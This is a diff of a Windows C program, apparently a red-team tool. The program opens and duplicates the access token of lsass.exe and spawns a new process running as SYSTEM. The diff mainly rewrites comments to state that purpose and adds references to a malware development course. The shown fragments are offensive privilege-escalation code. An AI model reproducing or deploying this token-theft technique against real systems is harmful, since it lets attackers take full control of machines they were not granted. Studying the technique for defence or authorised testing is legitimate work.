@@ -1,3 +1,9 @@
+/*
+* Refs:
+* https://securitytimes.medium.com/understanding-and-abusing-process-tokens-part-i-ee51671f2cfa
+* https://institute.sektor7.net/red-team-operator-malware-development-essentials
+*/
+
 #include <windows.h>
 #include <tlhelp32.h>
 #include <wincrypt.h>
@@ -70,7 +76,6 @@ int main(int argc, char** argv)
 	
 	// Next we open the primary token associated with the process (processHandle) and assign it to a pointer (currentTokenHandle)
 	//
-	//HANDLE primaryTokenHandle = NULL;
 	BOOL getToken = OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &currentTokenHandle);
 	
 	if (GetLastError() == NULL)
@@ -84,7 +89,7 @@ int main(int argc, char** argv)
 		printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
 	}
 	
-	// Call DuplicateTokenEx(), print return code and error code
+	// We duplicate the token in lsass.exe
 	//
 	HANDLE duplicateTokenHandle = NULL;
 	
@@ -100,10 +105,10 @@ int main(int argc, char** argv)
 		printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
 	}
 	
-	// Call CreateProcessWithTokenW(), print return code and error code
+	// finally we create a new process with the duplicated token (SYSTEM)
 	//
 	STARTUPINFO startupInfo;
-    PROCESS_INFORMATION processInformation;
+    	PROCESS_INFORMATION processInformation;
 	
 	ZeroMemory(&startupInfo, sizeof(startupInfo));
 	startupInfo.cb = sizeof(startupInfo);
